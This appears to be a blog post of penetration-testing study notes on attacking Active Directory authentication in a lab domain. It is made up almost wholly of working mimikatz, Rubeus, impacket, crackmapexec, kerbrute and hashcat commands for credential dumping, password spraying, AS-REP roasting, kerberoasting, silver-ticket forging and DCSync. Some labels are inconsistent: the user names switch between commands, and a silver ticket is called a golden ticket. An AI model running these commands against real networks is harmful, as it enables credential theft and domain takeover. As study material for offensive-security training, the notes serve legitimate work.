---
layout: post
title: Active Directory Auth Attacks
titledate: 09/26/23
tags: ["infosec", "offsec", "ad", "powershell", "mimikatz", "rubeus", "impacket", "hashcat"]
---

#### pass cracking

    PS> .\mimikatz.exe

dump user hashes

    mimikatz# sekurlsa::logonpasswords

open another powershell window to create a service ticket

    PS> dir \\web04.corp.com\backup

can show that ticket in mimikatz

    mimikatz# sekurlsa::tickets

view lockout information

    PS> net accounts

slow password spraying attack using LDAP and ADSI

    PS> powershell -ep bypass

we can use a wordlist for passwords

    PS> .\Spray-Passwords.ps1 -Pass password! -Admin

our attack machine also has the tool crackmapexec that we can use to perform a similar sprayin function with an argument continue-on-success that will continue guessing even if accounts are found
    
    $ crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success

### crackmapexec output is Pwned if user has admin privs on a machine

another tool is called kerbrute

    PS> .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt .\passwords.txt

for these 2 tools we can provide a list of usersnames that we've enumerated for the domain or we can use built in enumeration options in the tools

#### AS-REP roasting

if we have discovered pete's creds we can use GetNPUsers

    $ impacket-GetNPUsers -dc-ip 192.168.1.1  -request -outputfile hashes.asreproast corp.com/jim

this determines another user dave has the option Do not require Kerberos preauth enabled

this means his account is vulnerable to AS-REP roasting

let's determine which mode to use with hashcat

    $ hashcat --help | grep -i "Kerberos"

    $ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

to peform as-rep roasting on widows we use Rubeus

    PS> .\Rubeus.exe asreproast /nowrap

this will give us the as-rep hash of a user

then back on our kali machine 

    $ sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

#### kerberoasting

    PS> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast

we need hashcat to crack a TGS-rep hash

    $ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

if we can't run rubeus we can use impacket

    $ sudo impacket-GetUserSPNs -request -dc-ip 192.168.1.1 corp.com/john

#### silver ticket

we need a silver ticket to get access to an HTTP SPN resource

let's see if our user has access to the resource of the HTTP SPN mapped to the iis_service

    PS> iwr -UseDefaultCredentials http://web04

launch PS as admin adn load mimikatz

    mimikatz# privilege::debug

now we can dump the NTLM hash of the user that is mapped to the HTTP SPN , in this case iis_service

    mimikatz# sekurlsa::logonpasswords

this will give us the SID we need

    mimikatz# kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin

this will create a <h3>golden ticket</h3> for the user jeffadmin

we confirm our ticket is created and available

    PS> klist

### NOTE: needs to happen inside the same cmd window/ process

now we can try to verify if we have access to the HTTP SPN like we did before

    PS> (iwr -UseDefaultCredentials http://web04).Content

.Content to get the html content of the page

we've forged a service ticket for a user that gives us access to a web page

#### dcsync 

we canuse mimikatz for this attack

    mimikatz# lsadump::dcsync /user:corp\jim

then crack the pass with hashcat

    $ hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

against the admin

    mimikatz# lsadump::dcsync /user:beyond\Administrator

with impacket providing a user with access and the domain controller

    $ impacket-secretsdump -just-dc-user jim corp.com/jeffadmin:"pass123!"@192.168.1.1